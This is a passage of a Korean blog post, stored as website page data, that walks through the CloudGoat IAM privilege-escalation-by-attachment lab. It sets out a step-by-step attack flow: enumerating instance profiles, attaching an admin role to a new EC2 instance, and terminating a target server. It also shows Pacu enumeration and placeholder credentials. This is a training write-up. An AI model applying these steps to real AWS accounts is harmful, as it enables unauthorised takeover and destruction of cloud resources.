{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/cloud-service-vuln-5/",
    "result": {"data":{"cur":{"id":"91bbce86-6f64-5ed2-8f9a-2b6a4ea1a6ca","html":"<h1 id=\"클라우드-서비스-취약점-분석-5\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-5\" aria-label=\"클라우드 서비스 취약점 분석 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 5</h1>\n<h1 id=\"scenario-4--iam-privilege-escalation-by-attachment\" style=\"position:relative;\"><a href=\"#scenario-4--iam-privilege-escalation-by-attachment\" aria-label=\"scenario 4  iam privilege escalation by attachment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 4]:  IAM Privilege Escalation By Attachment</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Medium\nDifficulty: Moderate\nCommand: $ ./cloudgoat.py create iam_privesc_by_attachment</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>vpc (EC2)</li>\n<li>1 IAM User</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User “Kerrigan”</li>\n<li><code class=\"language-text\">iam:AttachUserPolicy</code> 권한이 있는 공격자는 액세스 권한이 있는 사용자에게 정책을 연결하고 해당 정책에 대한 권한을 공격자에게 추가하여 권한을 상승시킬 수 있습니다.</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>EC2 instance “cg-super-critical-security-server.”를 삭제하는 것!</li>\n<li>접근 권한 구성이 갖쳐져 있는 환경에서 공격자는 <code class=\"language-text\">instance-profile-attachment</code> 권한을 활용하여 현재 권한이 아닌 높은 권한으로 새로운 EC2 인스턴스를 생성할 수 있습니다.</li>\n<li>새로운 EC2 인스턴스에서 액세스를 통해 공격자는 대상 계정 내에서 모든 관리 권한을 획득합니다.</li>\n<li><code class=\"language-text\">cg-super-critical-security-server</code> 를 삭제를 합니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADNElEQVQoz0WRXUhTcRjGX4O2nTmlCMp2ztHtbM751Qc2yZk5bep0+7ud4xS3cmaBfVjUIKEks2al22o0nREpdCFU2JdhCZVZkAQZQRd1EyRk0aelUU7HTv3jLKOLh/fux/O8P2AYtSwjc5UpI3P1WtgzGpebbz5gLK+9ZbHWXarkGq5abPVX0MKtQJsvI9Y1YLG5LhuMVUM6vWULAIBSwUgpiiYoihIBTVGENj1bmaZWk9xDDBma7JZSIxqvtDkf2az2ewhxIwhx9xCyjyK2btzKOscsqGa0oNA0npnKbK71z4Ima71MvnK5ABQDrdJKAGBRdkMgvrB3vq5xBDfmXsQVqv0/aOTDTWwAN7Kn8R7kw1UYY9jQ9rvE6sfNNd24qfoMdhtb3m4CgDhVVqE0BlRlFxAAsDh3533aHvw277/5BTtCX6eLDk85UWf0e00g+qnqFD+LOiJj6blsQplntstxhg9v7Ym+rwlEI8VtP496MAZtnlMWAyoZLbFMBGJt0bklx5v79/UdC3Z4m3t35bvfrbN5w2dZb7jb5p3rRSd+tCTl7EiweKZqOd/cec4X7uJ8c30Wz2er8EfN2tL4GJAk5RIqmSGSloJYmCTkwgsMxQffbOT8/OeGHn7CGeS/WDoidwBAzHrDfleIn3Z18xP1IX6a7fzZ+hhjyMp3/G1IUZSEJOWEAF2j2xRvMG9LFH5S3Dqz3XQ8MmTzRgZs3si10vbIwEb3y6w892s91zmzb0tgpsncPrM3zz2hFxwo0/VS8j+QFAxJKIoiMvQO2RWMwXwi3OMM8h+2hqIvtp+NvqwO8FMlLZMFpZ45lyOIH+zu+3XbHsAjZZ5w/Q2MIXUdK6NIUphMxoALV5KsTCOUjIpIpHRS88n5Ac7PT1Z6o5MlR77WSVbopPHGof5lFcNPFPaRsaXlw0+JosGQDECUolATclr9t6HQ7H9oIoVJE8yLTIde5VSffF9ubf9oLdr/TJOiq08QG276l5iGrzPVd/sTy4YHxYbBtqQ4ENEKDSGnmVhD8b92/yJfmSRRpuUQgqDnC6IUmQZp6qpCKXgwkB4MldcxrGjFAAEMdLJC8CBE9AcAckKIsOmrhAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"30.png\"\n        title=\"30.png\"\n        src=\"/static/6acbb3ac1999559b254d8cd6d3c3054a/37523/30.png\"\n        srcset=\"/static/6acbb3ac1999559b254d8cd6d3c3054a/e9ff0/30.png 180w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/f21e7/30.png 360w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/37523/30.png 720w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/302a4/30.png 1080w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/07a9c/30.png 1440w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/4435f/30.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABV0lEQVQoz22R127CUBBELy22ce8dNwyYaogTFIm85P//aaJdhAQSD6Mtujs+uxZ+XMF0M6hWCNUModkRFC3gem7ee5wbAXQngqz5GE0sjKf2WwnDi6A5Aaayg/HMwlSyOU4+bEwkm+tHb6bc34iRycPvjEWSbdCuP5FmHRblnpUtdoiSFcJ4xfWyvcDza6haAsspoKgRxNh8T7ioDjj2N9Rtj3X3hc32G6vNwHnTnpHmHdbdgKbt4QU1HK9kw2e651zQF4nSdkt4QQPXr+CHDQ8TIdWGlcOwMn4jhA4hNDYhyocZRe4RxXD9w6obsD/+sLrdlc9Asb/84nS+oWxOKOsjn2CuxZAUH5ISYCZ5r4R5sePBojqgXvY8VDUnzoNoyVS0NilO10jzLdMTuRc20M3s1VCeB/wDSGRA61JOkcxUPWHpZgpVj2HaOWy34BNoRooP2X9Z+x/v78fOsV1suQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/8d79af64ad9f8b715dd67b8b69581204/37523/0.png\"\n        srcset=\"/static/8d79af64ad9f8b715dd67b8b69581204/e9ff0/0.png 180w,\n/static/8d79af64ad9f8b715dd67b8b69581204/f21e7/0.png 360w,\n/static/8d79af64ad9f8b715dd67b8b69581204/37523/0.png 720w,\n/static/8d79af64ad9f8b715dd67b8b69581204/c1328/0.png 866w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyklEQVQI1y3OzU6DQAAAYRJtaqPVRNNLQwW2FCh/29KyLLsEQjWePJgmvfr+bzEmxMN3mdM40g357kcyWVOrHlV3pPXAIu8RImUXlWy8mECkeH6CF+wJdwXbMCeKJXFWkfoF14eK28ri+JsEoy8kqaKQlvJgyaVBRBVhdGSfqamJUOKLkmBbsnxxeVyueXpeM1+suJu9Mr9/mzgqKvm93mjMiNIDrR44dl+4ww/y0ExO5w7bfaLbkdZe0Gak0QO2+0CeDMl79n9o+AN7Sls7SI82CwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/bee1d92425d022ca91e3f1b7d86cde74/37523/1.png\"\n        srcset=\"/static/bee1d92425d022ca91e3f1b7d86cde74/e9ff0/1.png 180w,\n/static/bee1d92425d022ca91e3f1b7d86cde74/f21e7/1.png 360w,\n/static/bee1d92425d022ca91e3f1b7d86cde74/37523/1.png 720w,\n/static/bee1d92425d022ca91e3f1b7d86cde74/efc66/1.png 885w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ol>\n<li>공격자는 IAM 사용자 “Kerrigan”으로 시작하여 높은 수준의 접근제어 권한에서 취약점 분석을 진행합니다.</li>\n<li>공격자는 먼저 EC2 인스턴스를 조회하면서 <code class=\"language-text\">cg-super-critical-security-server</code>을 식별은 하지만 대상에 직접 영향을 줄 수 가 없기 때문에 다른 방향으로 접근합니다.</li>\n<li>공격자는 계정 내의 기존 인스턴스 프로필과, 역활들을 Enum 하고 사용할 수 있는 인스턴스 프로필과 Rule을 결정합니다.</li>\n<li>때를 기다리던 공격자는 전체 관리자 역활을 인스턴스 프로필로 변경합니다.</li>\n<li>다음으로 공격자는 새로운 EC2 Key-Pair를 생성합니다.</li>\n<li>공격자는 해당 key-pari으로 새로운 EC2 인스턴스를 생성함으로써 셸 접근 권한이 생기게 되었습니다.</li>\n<li>익스플로잇의 마지막 단계에로서 공격자는 전체적인 관리자 권한이 부여된 인스턴스 프로필을 EC2 인스턴스에 연결을 합니다.</li>\n<li>새로운 EC2 인스턴스에 액세스 하고 스테이징 플랫폼으로 사용함으로써 공격자는 연결된 프로필의 역활에 의해 부여된 전체 관리자 권한으로 AWS CLI 명령을 실행할 수 있습니다.</li>\n<li>공격자는 “cg-super-critical-security-server” EC2 인스턴스를 종료하여 시나리오를 완료할 수 있습니다.</li>\n</ol>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"kerrigan-iam-profile\" style=\"position:relative;\"><a href=\"#kerrigan-iam-profile\" aria-label=\"kerrigan iam profile permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Kerrigan IAM Profile</h3>\n<ul>\n<li>해당 환경에서 AWS Security Credential 정보가 있는 것을 확인할 수 있습니다.  해당 정보를 토대로 enum를 수행하려는 경우 첫 번째 단계는 AWS CLI를 사용해서 Security Credential 새로 생서하는 것입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxklEQVQY042QyQ6CQBBER9zYRrZhGdlEVMQFDSEeNMb4/x9VxjbxKB6qK33ol65iIlgikGvIuIIflojTGvOkxmrTYmanUI0QuhlBGTkYDG3yX2KuKAiW5nuSKxYw+JyOGeMfDWZgivUXlKl6iLZ7oDnfcG7vpO7yxKG5Isl2sN0MlpOBW/EX9gvK3qMoT6j3F1R1R5Hz4ki+KBvIZAvPL/CuZqoFYErPhwaX4FYCEZTUoePl0IwIE9UngG5K2jUzwngqeiO/ALLQeH72UtYxAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2\"\n        title=\"2\"\n        src=\"/static/401003a28174efafcdd68d8b0a877161/37523/2.png\"\n        srcset=\"/static/401003a28174efafcdd68d8b0a877161/e9ff0/2.png 180w,\n/static/401003a28174efafcdd68d8b0a877161/f21e7/2.png 360w,\n/static/401003a28174efafcdd68d8b0a877161/37523/2.png 720w,\n/static/401003a28174efafcdd68d8b0a877161/4b446/2.png 877w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>pacu 도구를 사용하여 <code class=\"language-text\">aws__enum__account</code> 정보를 토대로 <code class=\"language-text\">kerrigan</code> 사용자의 aws accountid와 동일하지를 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABjUlEQVQoz2WOWXOaYABFv2hrmhYENC4sn0tEQGQTRRC3NiZ9sP//95xOmLYvfThz79yHO0d405CXeUR/MMdyAgZjl+F4ycj0eB4tmq0/dNEGLp2nEaKl0fpkNDy09X/9L2K6SLFlyGS2JsvPrOOKNL+w2V4JwoKi/MEqrtkd7wwt/7+DD9p/aA5NGWI6K0w7IEpq/HBPHFesVgXLYEecHgmjiqJ8ZennGP0ZmjFBtHSEUBBCRbS7iAcF0dYQxXpLWZyIkj316Y3j4Tve6Y5Mz+RZSbqpidOPPPCyiLCcJXIa4EiP2TxEzgKKJ4+7miMfJeIU5twu7ySbI/nuQlFc8TdnHDcjWG0JoxLXy7AcHzlZMTJdurqDZkh0Q6JqNoOOifw6RekMEYe85ufbL7bFhd3+SlVeCE53guqdJNo1hof61thX9StFeSXNDmSbmiSrGuPsi8tNSbA6NsI3LNzJEq0n6eo2mmbR6c34rDlN/6aOUVSTrmahdk003cboT9B7kt7ztMF5dPCUBXpnxG/PhsHnSbF6iQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3\"\n        title=\"3\"\n        src=\"/static/6e36a6c33077f06366a996b361838082/37523/3.png\"\n        srcset=\"/static/6e36a6c33077f06366a996b361838082/e9ff0/3.png 180w,\n/static/6e36a6c33077f06366a996b361838082/f21e7/3.png 360w,\n/static/6e36a6c33077f06366a996b361838082/37523/3.png 720w,\n/static/6e36a6c33077f06366a996b361838082/c6bbc/3.png 910w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 AWS 정보를 이용하여 enumeration 정보를 확인해 봤습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">cloudgoat_output_aws_account_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span>\ncloudgoat_output_kerrigan_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\ncloudgoat_output_kerrigan_secret_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span></code></pre></div>\n<ul>\n<li>AWS Security Credential을 토대로 enumeration 한 결과 좀더 조사할 가치가 있음을 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABIElEQVQoz22RWW+DMBCEHXKgUiAJN4aGI9xQcpOqVVW1//8/TWRHaaDpw8i7D/vN7JoEUQPTSWD7BYKgRkhL+E6KiFagNIflpnC9Asrch2mvuWyaQV34IMIcwmQ5ECnrM8K45UrzA+JshzDZIKtOcL0cFjNzU8xEg9dZcYSseiCjO2w0XtyB63SHIHrFKmw4lPUMnGR7UJ8l8yDJLiYzDZoRYrP/hCQ7v+n6MA7cHb5QNW8o6w5N+452+4HT+QfH7htF1UF8MkFGKgewhMysD3kAsnV0M4ZmRDCsmNcOzWDaCZ4Vtzc4h25G8FcVCJG4wQ02WJkQ5ZqAidxe5SpheKelHuAlbLghq6ei/pjw7y/9JzY0nmp85TjZ8lv30/eBF3CGrDYVtXmVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4\"\n        title=\"4\"\n        src=\"/static/6c3fdb1852b6f336da6a6f80736e8781/37523/4.png\"\n        srcset=\"/static/6c3fdb1852b6f336da6a6f80736e8781/e9ff0/4.png 180w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/f21e7/4.png 360w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/37523/4.png 720w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/302a4/4.png 1080w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/07a9c/4.png 1440w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/1d499/4.png 1632w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>시나리오 최종 목푱니 EC2 머신인 ‘cg-super-critical-security-server’ 가 사용 가능하지를 확인해봤습니다. AWS Rule은 EC2 태그를 검색할 수 있도록 태그 키가 “Name”인 태그에 EC2 인스턴스의 이름을 추가로 넣는 것 입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: 